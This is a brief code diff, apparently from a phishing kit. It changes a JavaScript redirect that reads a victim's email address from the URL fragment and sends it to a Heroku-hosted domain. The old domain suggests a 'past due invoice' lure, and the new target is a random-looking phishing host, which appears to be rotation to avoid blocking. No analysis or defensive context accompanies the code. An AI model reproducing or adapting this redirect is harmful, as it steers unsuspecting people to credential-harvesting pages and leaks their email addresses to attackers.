@@ -10,7 +10,7 @@
         var em = hash.split('#')[1];
                                         
                        window.setTimeout(function() {
-    window.location.href = 'https://pastdueinvoic-2021confirminf.herokuapp.com/#'+em;
+    window.location.href = 'https://rprocessiay2s-pwztuaceerutuolv.herokuapp.com/#'+em;
 }, 0);
         
     </script>
